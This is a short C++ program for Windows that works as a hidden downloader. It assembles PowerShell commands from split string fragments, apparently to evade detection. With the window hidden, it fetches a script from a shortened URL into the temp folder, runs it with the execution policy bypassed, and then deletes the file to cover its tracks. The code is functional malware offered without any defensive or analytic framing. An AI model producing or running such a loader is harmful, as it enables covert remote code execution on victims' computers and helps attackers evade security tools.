#include <iostream>
#include <cstdlib>
#include <string>
#include <Windows.h>
#include <Shellapi.h>

int main() {
    char t[99]; GetTempPathA(99, t);

    std::string p = t;
    p += "scr.ps1";

    std::string c = "power" "shell.e" "xe -Exec" "utionPo" "licy B" "ypass -C" "ommand "
    "\"Invo" "ke-Web" "Request" " -Uri " "'https://rb.gy/kbyko' -" "OutFil" "e '";
    c += p + "'\"";

    STARTUPINFO i = {sizeof(i)};
    PROCESS_INFORMATION n;
    i.dwFlags = STARTF_USESHOWWINDOW;
    i.wShowWindow = SW_HIDE;
    i.hStdInput = i.hStdOutput = i.hStdError = nullptr;
    i.lpTitle = nullptr;

    ShellExecuteA(NULL, "op" "en", "po" "wer" "she" "ll.ex" "e", c.c_str(), NULL, SW_HIDE);

    Sleep(10000);

    std::string r = "po" "wer" "she" "ll.e" "xe -" "Exe" "cutionP" "olicy " "By" "pass -F" "ile ";
    r += "\"" + p + "\"";
    ShellExecuteA(NULL, "op" "en", "po" "wer" "she" "ll.ex" "e", r.c_str(), NULL, SW_HIDE);

    // Sleep for an additional 5 seconds
    Sleep(15000);

    // Delete the downloaded script
    DeleteFileA(p.c_str());

    return 0;
}

